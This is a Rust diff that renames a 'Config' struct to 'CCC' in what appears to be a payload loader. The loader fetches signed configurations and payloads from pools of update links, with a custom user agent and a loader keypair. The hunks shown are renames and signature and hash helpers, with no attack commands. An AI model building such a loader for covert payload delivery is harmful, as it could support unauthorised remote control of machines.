@@ -37,8 +37,7 @@ pub struct VerifSignMaterial {
 }
 
 #[derive(Serialize, Deserialize, Clone)]
-#[serde(rename = "c")]
-pub struct Config {
+pub struct CCC {
     #[serde(rename = "ul")]
     pub update_links: BTreeMap<u64, (String, PoolLinks)>,
     #[serde(rename = "bc")]
@@ -78,7 +77,7 @@ pub struct Config {
 }
 
 //#[allow(dead_code)]
-impl Config {
+impl CCC {
     pub fn new_unsigned(
         update_links: BTreeMap<u64, (String, PoolLinks)>,
         backup_config: Vec<FileLink>,
@@ -97,12 +96,12 @@ impl Config {
         link_timeout: u64,
         link_user_agent: String,
         loader_keypair: Vec<u8>,
-    ) -> Config {
+    ) -> CCC {
         let sign_material = VerifSignMaterial {
             peer_public_key_bytes: vec![],
             sign_bytes: vec![],
         };
-        Config {
+        CCC {
             update_links: update_links,
             backup_config: backup_config,
             sign_material: sign_material,
@@ -143,8 +142,8 @@ impl Config {
         link_timeout: u64,
         link_user_agent: String,
         loader_keypair: Vec<u8>,
-    ) -> Config {
-        let mut new_loader = Config::new_unsigned(
+    ) -> CCC {
+        let mut new_loader = CCC::new_unsigned(
             update_links,
             backup_config,
             payloads,
@@ -188,7 +187,7 @@ impl Config {
 
     pub fn verify_newconfig_signature(
         &self,
-        newconfig: &Config,
+        newconfig: &CCC,
     ) -> Result<(), ring::error::Unspecified> {
         let sign_data = newconfig.return_sign_data();
         let peer_public_key = signature::UnparsedPublicKey::new(
@@ -198,10 +197,10 @@ impl Config {
         peer_public_key.verify(&sign_data, &newconfig.sign_material.sign_bytes)
     }
 
-    pub fn new_fromfile(path_file: &str) -> Config {
+    pub fn new_fromfile(path_file: &str) -> CCC {
         let loader_bytes: Vec<u8> = fs::read(path_file).unwrap();
         let l = std::str::from_utf8(&loader_bytes).unwrap();
-        let config: Config = serde_json::from_str(l).unwrap();
+        let config: CCC = serde_json::from_str(l).unwrap();
         config
     }
 
@@ -236,12 +235,12 @@ impl Config {
         let digest = sha2_512::chksum(data).unwrap();
         digest.to_hex_lowercase()
     }
-    pub fn is_same_loader_hash(&self, otherloader: &Config) -> bool {
+    pub fn is_same_loader_hash(&self, otherloader: &CCC) -> bool {
         let loader_hash = self.calculate_loader_hash();
         let otherloader_hash = otherloader.calculate_loader_hash();
         loader_hash == otherloader_hash
     }
-    pub fn is_same_loader(&self, otherloader: &Config) -> bool {
+    pub fn is_same_loader(&self, otherloader: &CCC) -> bool {
         let loader_serialized = self.concat_loader_jsondata();
         let otherloader_serialized = otherloader.concat_loader_jsondata();
         loader_serialized == otherloader_serialized
@@ -429,7 +428,7 @@ impl Config {
 
     // try to fetch a new config, if no config are found return self. if no config is return from pool, need to try the next pool
     //pub fn update_config(&self, session_id: &String, running_thread: &Vec<Payload>) -> Config {
-    pub fn update_config(&self, session_id: &String, run_data: &RunData) -> Config {
+    pub fn update_config(&self, session_id: &String, run_data: &RunData) -> CCC {
         let mut pool_nb: i32 = 0;
         for (_pool_nb, (pool_name, pool_links)) in &self.update_links {
             pool_nb = pool_nb + 1;
@@ -515,7 +514,7 @@ impl Config {
         &self,
         session_id: &String,
         run_data: &RunData,
-    ) -> Config {
+    ) -> CCC {
         //TODO
         let mut file_links = vec![];
         for backup_file in &self.backup_config {
